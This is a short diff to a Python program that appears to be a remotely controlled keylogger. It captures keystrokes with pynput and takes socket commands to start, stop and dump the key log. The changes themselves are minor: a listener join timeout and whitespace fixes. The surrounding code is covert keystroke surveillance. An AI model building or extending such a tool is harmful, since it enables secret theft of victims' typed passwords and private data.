@@ -43,7 +43,7 @@ def keyBoardLoggerFunc():
     try:
         keyboard_Listener = pynput.keyboard.Listener(on_press=process_Key_Press)
         with keyboard_Listener:
-            keyboard_Listener.join()
+            keyboard_Listener.join(0.1)
     except Exception as ex:
         cprint("[-]Something wen Wrong", color.red)
     finally:
@@ -145,8 +145,8 @@ def main():
                     print("[+] Keylogger thread joined..")
                     keylogthread.join()
                     send_Message(sock, "Key Logger Stopped")
-                    keyboard_Listener=None
-                    keylogthread=None
+                    keyboard_Listener = None
+                    keylogthread = None
                 else:
                     send_Message(sock, "No key logger running")
                 continue
@@ -161,7 +161,7 @@ def main():
                 else:
                     send_Message(sock, "Key board Logger Already Running....")
                 continue
-            
+
             # dump log
             if command == "dump log":
                 print("[+] dum log", dumpLog())
